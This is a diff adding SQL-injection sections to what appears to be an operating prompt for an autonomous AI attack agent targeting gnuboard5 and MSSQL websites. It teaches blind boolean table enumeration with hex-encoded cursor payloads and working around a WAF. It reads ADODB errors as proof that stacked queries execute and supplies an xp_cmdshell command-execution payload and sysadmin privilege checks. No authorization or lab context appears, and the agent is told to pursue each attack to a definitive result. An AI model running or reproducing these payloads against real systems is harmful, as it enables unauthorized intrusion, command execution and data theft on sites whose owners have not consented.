@@ -402,6 +402,73 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
     presence of 'logout' OR user ID in response body
     absence of 'login form' or 'password' field in response body
 
+  ── 6. TABLE ENUMERATION — MANDATORY DEDUPLICATION + PAGINATION ──
+  THE MOST COMMON FAILURE: name LIKE 'A%' TOP 1 always returns the same table!
+  WRONG (causes infinite loop):
+    for i in range(100):
+        result = query("SELECT TOP 1 name FROM sysobjects WHERE name LIKE 'A%'")
+        print(result)  # prints ARREO_SMS 100 times!
+
+  CORRECT (pagination with cursor):
+    seen = set()
+    last = ""  # hex of last seen table name
+    while True:
+        if last == "":
+            payload = "AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55 AND name LIKE 0x41...)"
+        else:
+            payload = f"AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55 AND name LIKE 0x41... AND name > {last})"
+        result = extract_value(payload)
+        if not result or result in seen:
+            break  # ← EXIT immediately when duplicate or no result
+        seen.add(result)
+        last = to_hex(result)
+        print(result)
+
+  DEDUPLICATION RULE: If the SAME table name appears twice in a row → STOP immediately.
+  NEVER print a table name more than ONCE. Use a `seen = set()` and check before printing.
+  MAX ITERATIONS per letter: 10 (if no new table found after 10 attempts, move to next letter).
+
+  ── 7. NOT IN Failure = Stop Using NOT IN ──
+  If `NOT IN (0x...)` returns the SAME table repeatedly (3+ times) → the NOT IN clause is being
+  blocked by WAF or the hex is malformed.
+  CORRECT recovery:
+    1. Switch to `AND name > {hex_of_last}` cursor pagination instead of NOT IN
+    2. If cursor also fails → use `name LIKE 'X%'` per-letter enumeration (with dedup!)
+  NEVER continue a loop if the same result appears more than 2 times.
+
+  ── 8. ADODB 800a0cc1 = Stacked Query Opportunity ──
+  ADODB.Recordset 오류 '800a0cc1':
+    "요청한 이름 또는 서수에 해당하는 컬렉션에서 항목을 찾을 수 없습니다."
+  This means: semicolon split the query BUT the second query returned a recordset
+  with no column named in the ADO access pattern.
+  INTERPRETATION: Stacked queries ARE executing! The error is in recordset column access.
+  NEXT STEP: Use stacked query for side effects (INSERT, UPDATE, xp_cmdshell) not SELECT.
+    Try: payload = "4; EXEC master..xp_cmdshell 'whoami'--"
+    Or:  payload = "4; INSERT INTO tmptable(col) SELECT @@version--"
+
+  ── 9. IS_SRVROLEMEMBER Must Be Conclusively Determined ──
+  If IS_SRVROLEMEMBER returns ambiguous result (not clear TRUE/FALSE):
+    CORRECT: Use alternative sysadmin check:
+      SELECT TOP 1 name FROM master..sysdatabases WHERE HAS_DBACCESS(name)=1
+      SELECT IS_MEMBER('db_owner')
+      SELECT SYSTEM_USER  -- if returns 'sa' → sysadmin
+      SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID
+  RULE: Do NOT mark sysadmin check as "❓ unclear" — must pursue to definitive answer.
+
+  ── 10. Boolean Oracle Calibration Check (MANDATORY) ──
+  BEFORE using boolean oracle for data extraction:
+    Step 1: TRUE condition  — `AND(1)=(1)` → record response size as TRUE_SIZE
+    Step 2: FALSE condition — `AND(1)=(2)` → record response size as FALSE_SIZE
+    Step 3: Baseline       — normal param  → record as BASE_SIZE
+  VALID oracle: TRUE_SIZE ≠ FALSE_SIZE (difference > 100B)
+  INVALID oracle if:
+    - TRUE_SIZE == BASE_SIZE (TRUE doesn't change anything → oracle inverted or broken)
+    - TRUE_SIZE == FALSE_SIZE (no difference at all)
+  RULE: If TRUE_SIZE != BASE_SIZE → the oracle is INVERTED (TRUE looks like error/redirect).
+        Flip the logic: use AND(1)=(2) as your "match" condition.
+  CRITICAL: For boardidx-type parameters where TRUE response ≠ BASE_SIZE, the field is
+        likely dynamic-content (page count changes) — validate with content keywords, not size.
+
 === SKILL SYSTEM ===
 You have 348 skills available. Load with: SKILL_LOAD: <name>
 Principle: Try direct execution first. Use SKILL_LOAD only as fallback after direct attempts fail.
